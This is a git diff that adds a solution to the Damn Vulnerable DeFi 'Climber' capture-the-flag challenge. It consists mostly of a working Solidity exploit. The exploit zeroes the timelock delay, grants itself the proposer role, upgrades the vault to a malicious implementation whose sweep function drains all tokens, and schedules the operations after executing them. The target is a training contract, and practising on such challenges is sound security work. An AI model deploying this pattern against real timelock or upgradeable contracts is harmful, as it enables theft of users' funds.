@@ -86,6 +86,9 @@ contract ClimberChallenge is Test {
      */
     function test_climber() public checkSolvedByPlayer {
         
+        // Ref: https://github.com/alexbabits/damn-vulnerable-defi-ctfs/blob/master/src/climber/ClimberAttack.sols
+        ExploitClimber exploitClimber = new ExploitClimber(vault , token,recovery);
+        exploitClimber.exploit();
     }
 
     /**
@@ -94,5 +97,62 @@ contract ClimberChallenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+contract ClimberVaultV2 is ClimberVault {
+    function sweep(DamnValuableToken token, address attackerEOA) public {
+        token.transfer(attackerEOA, token.balanceOf(address(this)));
+    }
+}
+
+contract ExploitClimber {
+    ClimberVault vault;
+    ClimberTimelock timelock;
+    DamnValuableToken token;
+
+    address[] targets;
+    uint256[] values;
+    bytes[] dataElements;
+
+    constructor(ClimberVault _vault, DamnValuableToken _token, address recovery) {
+        vault = _vault;
+        timelock = ClimberTimelock(payable(vault.owner()));
+        token = _token;
+        targets = [address(timelock), address(timelock), address(vault), address(this)];
+        values = [0, 0, 0, 0]; // ETH value to send can be 0.
+        dataElements = [
+            // 1st dataElement: Set the delay of the timelock to 0. Important for immediate execution of scheduled operation.
+            abi.encodeWithSelector(timelock.updateDelay.selector, 0),
+            // 2nd dataElement: Grants us the PROPOSER role, so we can schedule operations.
+            abi.encodeWithSelector(timelock.grantRole.selector, PROPOSER_ROLE, address(this)),
+            // 3rd dataElement: Upgrades vault to our malicious vault, then calls our sweep function stealing the DVT.
+            // Params: {function selector, our malicious new vault address, data to be executed}
+            abi.encodeWithSelector(
+                vault.upgradeToAndCall.selector,
+                address(new ClimberVaultV2()),
+                // This is the data to be executed. We want to call `sweep` from our malicious vault to steal all the money.
+                // Params: {function selector, IERC20 token, our attacker address}
+                abi.encodeWithSelector(
+                    ClimberVaultV2.sweep.selector,
+                    address(token), 
+                   recovery
+                )
+            ),
+            // 4th dataElement: Our address must then call our `scheduleOperation` to `schedule` these operations.
+            abi.encodeWithSignature("scheduleOperation()")
+        ];
+        
+
+    }
+
+    // targets, values, dataElements all must be same length as they associate 1:1 during execution.
+    function exploit() public payable {
+       // Calls `execute` on `timelock` with all these prepared arguments.
+        timelock.execute(targets, values, dataElements, 0);
+    }
+
+    function scheduleOperation() public payable {
+        timelock.schedule(targets, values, dataElements, 0);
     }
 }
